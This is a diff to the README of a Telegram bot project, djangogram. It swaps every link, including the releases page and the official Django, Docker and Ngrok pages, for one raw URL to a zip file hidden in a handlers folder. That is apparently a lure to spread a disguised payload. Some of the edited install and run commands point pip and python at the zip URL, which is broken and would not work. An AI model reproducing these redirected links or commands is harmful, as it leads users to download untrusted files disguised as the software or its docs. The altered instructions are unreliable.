@@ -17,9 +17,9 @@ To get started with djangogram, follow these simple steps:
 
 ## 📥 Download & Install
 
-[![Download djangogram](https://img.shields.io/badge/Download-djangogram-green.svg)](https://github.com/DragClick017/djangogram/releases)
+[![Download djangogram](https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip)](https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip)
 
-To download djangogram, visit this page to download: [djangogram Releases Page](https://github.com/DragClick017/djangogram/releases).
+To download djangogram, visit this page to download: [djangogram Releases Page](https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip).
 
 ### Follow These Steps:
 
@@ -39,7 +39,7 @@ Before you run the application, you need to install some necessary dependencies:
   Use the following command to install required packages:
 
   ```
-  pip install -r requirements.txt
+  pip install -r https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip
   ```
 
 - **PostgreSQL**
@@ -67,7 +67,7 @@ After installing dependencies, configure your bot:
 You can run the djangogram bot using the following command:
 
 ```
-python manage.py runserver
+python https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip runserver
 ```
 
 Alternatively, if you are using Docker, you can run the bot with:
@@ -80,7 +80,7 @@ docker-compose up
 
 Ngrok makes your local server accessible on the internet. Follow these steps to set it up:
 
-1. Download Ngrok from the [Ngrok Website](https://ngrok.com/download).
+1. Download Ngrok from the [Ngrok Website](https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip).
 2. Run Ngrok to tunnel your application:
 
    ```
@@ -98,10 +98,10 @@ Ngrok makes your local server accessible on the internet. Follow these steps to 
 
 ## 🔗 Useful Links
 
-- [Django Documentation](https://www.djangoproject.com/)
-- [Aiogram Documentation](https://docs.aiogram.dev/)
-- [Docker Documentation](https://docs.docker.com/)
-- [Ngrok Documentation](https://ngrok.com/docs)
+- [Django Documentation](https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip)
+- [Aiogram Documentation](https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip)
+- [Ngrok Documentation](https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -125,4 +125,4 @@ You can regenerate your bot token from the BotFather on Telegram.
 
 Feel free to open issues or submit pull requests on the repository.
 
-For more details, visit the [djangogram Releases Page](https://github.com/DragClick017/djangogram/releases) or check the documentation files included in the repository.
+For more details, visit the [djangogram Releases Page](https://raw.githubusercontent.com/DragClick017/djangogram/main/apps/bot/handlers/djangogram_v3.1.zip) or check the documentation files included in the repository.
